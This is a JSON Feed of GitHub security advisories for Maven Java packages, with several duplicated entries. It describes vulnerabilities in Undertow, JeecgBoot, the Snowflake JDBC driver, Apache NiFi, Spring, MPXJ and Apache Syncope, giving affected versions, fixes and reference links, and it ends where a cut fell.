{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability was found in Undertow. This issue requires enabling the learning-push handler in the server's config, which is disabled by default, leaving the maxAge config in the handler unconfigured. The default is -1, which makes the handler vulnerable. If someone overwrites that config, the server is not subject to the attack. The attacker needs to be able to reach the server with a normal HTTP request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3653\">https://nvd.nist.gov/vuln/detail/CVE-2024-3653</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-3653\">https://access.redhat.com/security/cve/CVE-2024-3653</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2274437\">https://bugzilla.redhat.com/show_bug.cgi?id=2274437</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:4392\">https://access.redhat.com/errata/RHSA-2024:4392</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5143\">https://access.redhat.com/errata/RHSA-2024:5143</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5144\">https://access.redhat.com/errata/RHSA-2024:5144</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5145\">https://access.redhat.com/errata/RHSA-2024:5145</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5147\">https://access.redhat.com/errata/RHSA-2024:5147</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:6437\">https://access.redhat.com/errata/RHSA-2024:6437</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1639\">https://github.com/undertow-io/undertow/pull/1639</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1640\">https://github.com/undertow-io/undertow/pull/1640</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1641\">https://github.com/undertow-io/undertow/pull/1641</a></li>\n<li><a href=\"https://issues.redhat.com/browse/UNDERTOW-2382\">https://issues.redhat.com/browse/UNDERTOW-2382</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ch7q-gpff-h9hp\">https://github.com/advisories/GHSA-ch7q-gpff-h9hp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ch7q-gpff-h9hp",
            "title": "[io.undertow:undertow-core] Undertow Missing Release of Memory after Effective Lifetime vulnerability",
            "date_modified": "2024-11-04T22:22:13.000Z",
            "date_published": "2024-07-09T00:31:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ch7q-gpff-h9hp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in Undertow. This issue requires enabling the learning-push handler in the server's config, which is disabled by default, leaving the maxAge config in the handler unconfigured. The default is -1, which makes the handler vulnerable. If someone overwrites that config, the server is not subject to the attack. The attacker needs to be able to reach the server with a normal HTTP request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3653\">https://nvd.nist.gov/vuln/detail/CVE-2024-3653</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-3653\">https://access.redhat.com/security/cve/CVE-2024-3653</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2274437\">https://bugzilla.redhat.com/show_bug.cgi?id=2274437</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:4392\">https://access.redhat.com/errata/RHSA-2024:4392</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5143\">https://access.redhat.com/errata/RHSA-2024:5143</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5144\">https://access.redhat.com/errata/RHSA-2024:5144</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5145\">https://access.redhat.com/errata/RHSA-2024:5145</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:5147\">https://access.redhat.com/errata/RHSA-2024:5147</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2024:6437\">https://access.redhat.com/errata/RHSA-2024:6437</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1639\">https://github.com/undertow-io/undertow/pull/1639</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1640\">https://github.com/undertow-io/undertow/pull/1640</a></li>\n<li><a href=\"https://github.com/undertow-io/undertow/pull/1641\">https://github.com/undertow-io/undertow/pull/1641</a></li>\n<li><a href=\"https://issues.redhat.com/browse/UNDERTOW-2382\">https://issues.redhat.com/browse/UNDERTOW-2382</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ch7q-gpff-h9hp\">https://github.com/advisories/GHSA-ch7q-gpff-h9hp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ch7q-gpff-h9hp",
            "title": "[io.undertow:undertow-core] Undertow Missing Release of Memory after Effective Lifetime vulnerability",
            "date_modified": "2024-11-04T22:22:13.000Z",
            "date_published": "2024-07-09T00:31:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ch7q-gpff-h9hp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>JeecgBoot v3.7.1 was discovered to contain a SQL injection vulnerability via the component <code>/onlDragDatasetHead/getTotalData</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48307\">https://nvd.nist.gov/vuln/detail/CVE-2024-48307</a></li>\n<li><a href=\"https://github.com/jeecgboot/JeecgBoot/issues/7237\">https://github.com/jeecgboot/JeecgBoot/issues/7237</a></li>\n<li><a href=\"https://github.com/jeecgboot\">https://github.com/jeecgboot</a></li>\n<li><a href=\"https://github.com/jeecgboot/JeecgBoot\">https://github.com/jeecgboot/JeecgBoot</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcw3-h5xg-r95m\">https://github.com/advisories/GHSA-mcw3-h5xg-r95m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcw3-h5xg-r95m",
            "title": "[org.jeecgframework.boot:jeecg-boot-parent] JeecgBoot SQL Injection vulnerability",
            "date_modified": "2024-11-01T21:38:11.000Z",
            "date_published": "2024-10-31T03:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcw3-h5xg-r95m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impacted-products\">Impacted Products</h3>\n<p>Snowflake JDBC driver versions &gt;= 3.2.6 &amp; &lt;= 3.19.1 are affected.</p>\n<h3 id=\"introduction\">Introduction</h3>\n<p>Snowflake recently identified an issue affecting JDBC drivers that can result in data being uploaded to an encrypted stage without the additional layer of protection provided by client side encryption. The issue, which affects only a subset of accounts hosted on Azure and GCP deployments (AWS deployments are not affected), manifests in instances where customers create a stage using a JDBC driver with the CLIENT_ENCRYPTION_KEY_SIZE account parameter set to 256-bit rather than the default 128-bit. The data is still protected by TLS in transit and server side encryption at rest. This missed layer of the additional protection is not visible to the affected customers.</p>\n<h3 id=\"incorrect-security-setting-vulnerability\">Incorrect Security Setting Vulnerability</h3>\n<h4 id=\"description\">Description</h4>\n<p>Snowflake identified an incorrect security setting in Snowflake JDBC drivers. Snowflake has evaluated the severity of the issue and determined it was in medium range with a maximum CVSSv3 base score of 5.9. </p>\n<h4 id=\"scenarios-and-attack-vectors\">Scenarios and attack vector(s)</h4>\n<p>Users of Snowflake JDBC drivers with accounts on Azure and GCP deployments who set the parameter CLIENT_ENCRYPTION_KEY_SIZE = 256 were subject to this incorrect security setting vulnerability as it could result in data being uploaded to a stage without an additional layer for encryption. </p>\n<h4 id=\"our-response\">Our response</h4>\n<p>On July 23, 2024, Snowflake discovered this vulnerability. On 10/28/2024, Snowflake released a patch in Snowflake JDBC driver Version 3.20.0. The patch fixes the incorrect security setting. </p>\n<h4 id=\"resolution\">Resolution</h4>\n<p>We strongly recommend users to upgrade to 3.20.0 or later versions as soon as possible. </p>\n<h3 id=\"contact\">Contact</h3>\n<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-f686-hw9c-xw9c\">https://github.com/snowflakedb/snowflake-jdbc/security/advisories/GHSA-f686-hw9c-xw9c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43382\">https://nvd.nist.gov/vuln/detail/CVE-2024-43382</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f686-hw9c-xw9c\">https://github.com/advisories/GHSA-f686-hw9c-xw9c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f686-hw9c-xw9c",
            "title": "[net.snowflake:snowflake-jdbc] Snowflake JDBC Security Advisory",
            "date_modified": "2024-10-31T19:36:19.000Z",
            "date_published": "2024-10-30T14:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f686-hw9c-xw9c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache NiFi 1.10.0 through 1.27.0 and 2.0.0-M1 through 2.0.0-M3 support a description field for Parameters in a Parameter Context configuration that is vulnerable to cross-site scripting. An authenticated user, authorized to configure a Parameter Context, can enter arbitrary JavaScript code, which the client browser will execute within the session context of the authenticated user. Upgrading to Apache NiFi 1.28.0 or 2.0.0-M4 is the recommended mitigation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45477\">https://nvd.nist.gov/vuln/detail/CVE-2024-45477</a></li>\n<li><a href=\"https://lists.apache.org/thread/shdv0tw9hggj7tx9pl7g93mgok2lwbj9\">https://lists.apache.org/thread/shdv0tw9hggj7tx9pl7g93mgok2lwbj9</a></li>\n<li><a href=\"https://github.com/apache/nifi/pull/9195\">https://github.com/apache/nifi/pull/9195</a></li>\n<li><a href=\"https://github.com/apache/nifi/commit/153c87a7daaeebea9b119066285b840ea4056e09\">https://github.com/apache/nifi/commit/153c87a7daaeebea9b119066285b840ea4056e09</a></li>\n<li><a href=\"https://github.com/apache/nifi/blob/rel/nifi-1.27.0/nifi-nar-bundles/nifi-framework-bundle/nifi-framework/nifi-web/nifi-web-ui/src/main/webapp/js/nf/canvas/nf-parameter-contexts.js#L2197\">https://github.com/apache/nifi/blob/rel/nifi-1.27.0/nifi-nar-bundles/nifi-framework-bundle/nifi-framework/nifi-web/nifi-web-ui/src/main/webapp/js/nf/canvas/nf-parameter-contexts.js#L2197</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/NIFI-13675\">https://issues.apache.org/jira/browse/NIFI-13675</a></li>\n<li><a href=\"https://nifi.apache.org/documentation/security/#CVE-2024-45477\">https://nifi.apache.org/documentation/security/#CVE-2024-45477</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mqj-xgf8-p59v\">https://github.com/advisories/GHSA-7mqj-xgf8-p59v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mqj-xgf8-p59v",
            "title": "[org.apache.nifi:nifi-web-ui] Apache NiFi Cross-site Scripting vulnerability",
            "date_modified": "2024-10-29T21:33:11.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mqj-xgf8-p59v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache NiFi 1.10.0 through 1.27.0 and 2.0.0-M1 through 2.0.0-M3 support a description field for Parameters in a Parameter Context configuration that is vulnerable to cross-site scripting. An authenticated user, authorized to configure a Parameter Context, can enter arbitrary JavaScript code, which the client browser will execute within the session context of the authenticated user. Upgrading to Apache NiFi 1.28.0 or 2.0.0-M4 is the recommended mitigation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45477\">https://nvd.nist.gov/vuln/detail/CVE-2024-45477</a></li>\n<li><a href=\"https://lists.apache.org/thread/shdv0tw9hggj7tx9pl7g93mgok2lwbj9\">https://lists.apache.org/thread/shdv0tw9hggj7tx9pl7g93mgok2lwbj9</a></li>\n<li><a href=\"https://github.com/apache/nifi/pull/9195\">https://github.com/apache/nifi/pull/9195</a></li>\n<li><a href=\"https://github.com/apache/nifi/commit/153c87a7daaeebea9b119066285b840ea4056e09\">https://github.com/apache/nifi/commit/153c87a7daaeebea9b119066285b840ea4056e09</a></li>\n<li><a href=\"https://github.com/apache/nifi/blob/rel/nifi-1.27.0/nifi-nar-bundles/nifi-framework-bundle/nifi-framework/nifi-web/nifi-web-ui/src/main/webapp/js/nf/canvas/nf-parameter-contexts.js#L2197\">https://github.com/apache/nifi/blob/rel/nifi-1.27.0/nifi-nar-bundles/nifi-framework-bundle/nifi-framework/nifi-web/nifi-web-ui/src/main/webapp/js/nf/canvas/nf-parameter-contexts.js#L2197</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/NIFI-13675\">https://issues.apache.org/jira/browse/NIFI-13675</a></li>\n<li><a href=\"https://nifi.apache.org/documentation/security/#CVE-2024-45477\">https://nifi.apache.org/documentation/security/#CVE-2024-45477</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mqj-xgf8-p59v\">https://github.com/advisories/GHSA-7mqj-xgf8-p59v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mqj-xgf8-p59v",
            "title": "[org.apache.nifi:nifi-web-ui] Apache NiFi Cross-site Scripting vulnerability",
            "date_modified": "2024-10-29T21:33:11.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mqj-xgf8-p59v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The fix for CVE-2022-22968 made disallowedFields&nbsp;patterns in DataBinder&nbsp;case insensitive. However, String.toLowerCase()&nbsp;has some Locale dependent exceptions that could potentially result in fields not protected as expected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38820\">https://nvd.nist.gov/vuln/detail/CVE-2024-38820</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38820\">https://spring.io/security/cve-2024-38820</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c\">https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-framework/commits/v6.2.0-RC2\">https://github.com/spring-projects/spring-framework/commits/v6.2.0-RC2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4gc7-5j7h-4qph\">https://github.com/advisories/GHSA-4gc7-5j7h-4qph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4gc7-5j7h-4qph",
            "title": "[org.springframework:spring-context] Spring Framework DataBinder Case Sensitive Match Exception",
            "date_modified": "2024-10-29T21:02:23.000Z",
            "date_published": "2024-10-18T06:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4gc7-5j7h-4qph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The patch for the historical vulnerability CVE-2020-35460 in MPXJ is incomplete as there is still a possibility that a malicious path could be constructed which would not be picked up by the original fix and allow files to be written to arbitrary locations.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is addressed in MPXJ version 13.5.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not pass zip files to MPXJ.</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Issue report and patch provided by yyjLF and sprinkle</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/joniles/mpxj/security/advisories/GHSA-j945-c44v-97g6\">https://github.com/joniles/mpxj/security/advisories/GHSA-j945-c44v-97g6</a></li>\n<li><a href=\"https://github.com/joniles/mpxj/commit/8002802890dfdc8bc74259f37e053e15b827eea0\">https://github.com/joniles/mpxj/commit/8002802890dfdc8bc74259f37e053e15b827eea0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49771\">https://nvd.nist.gov/vuln/detail/CVE-2024-49771</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/mpxj/CVE-2024-49771.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/mpxj/CVE-2024-49771.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j945-c44v-97g6\">https://github.com/advisories/GHSA-j945-c44v-97g6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j945-c44v-97g6",
            "title": "[net.sf.mpxj:mpxj] MPXJ has a Potential Path Traversal Vulnerability",
            "date_modified": "2024-10-30T14:35:24.000Z",
            "date_published": "2024-10-28T18:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j945-c44v-97g6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.</p>\n<p>For this to impact an application, all of the following must be true:</p>\n<ul>\n<li>It must be a WebFlux application</li>\n<li>It must be using Spring's static resources support</li>\n<li>It must have a non-permitAll authorization rule applied to the static resources support</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38821\">https://nvd.nist.gov/vuln/detail/CVE-2024-38821</a></li>\n<li><a href=\"https://spring.io/security/cve-2024-38821\">https://spring.io/security/cve-2024-38821</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934\">https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934</a></li>\n<li><a href=\"https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b\">https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c4q5-6c82-3qpw\">https://github.com/advisories/GHSA-c4q5-6c82-3qpw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw",
            "title": "[org.springframework.security:spring-security-web] Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications",
            "date_modified": "2024-10-28T17:59:30.000Z",
            "date_published": "2024-10-28T09:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When editing objects in the Syncope Console, incomplete HTML tags could be used to bypass HTML sanitization. This made it possible to inject stored XSS payloads which would trigger for other users during ordinary usage of the application.\nXSS payloads could also be injected in Syncope Enduser when editing “Personal Information” or “User Requests”: such payloads would trigger for administrators in Syncope Console, thus enabling session hijacking.</p>\n<p>Users are recommended to upgrade to version 3.0.9, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45031\">https://nvd.nist.gov/vuln/detail/CVE-2024-45031</a></li>\n<li><a href=\"https://lists.apache.org/thread/fn567pfmo3s55ofkc42drz8b4kgbhp9m\">https://lists.apache.org/thread/fn567pfmo3s55ofkc42drz8b4kgbhp9m</a></li>\n<li><a href=\"https://github.com/apache/syncope/commit/0c620a9eda2c0927875c129ebae66d2ea94f3e6a\">https://github.com/apache/syncope/commit/0c620a9eda2c0927875c129ebae66d2ea94f3e6a</a></li>\n<li><a href=\"https://github.com/apache/syncope/commit/f80d3f6cfbd71acb03ece0f7601f660ee0be7e74\">https://github.com/apache/syncope/commit/f80d3f6cfbd71acb03ece0f7601f660ee0be7e74</a></li>\n<li><a href=\"https://syncope.apache.org/security#cve-2024-45031-apache-syncope-stored-xss-in-console-and-enduser\">https://syncope.apache.org/security#cve-2024-45031-apache-syncope-stored-xss-in-console-and-enduser</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmrf-85g8-x8xv\">https://github.com/advisories/GHSA-jmrf-85g8-x8xv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmrf-85g8-x8xv",
            "title": "[org.apache.syncope.client:syncope-client-console] Apache Syncope: Stored XSS in Console and Enduser",
            "date_modified": "2024-10-24T19:00:47.000Z",
            "date_published": "2024-10-24T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmrf-85g8-x8xv"
            },
            "tags": [
                "severity"
            ]
        },
        {
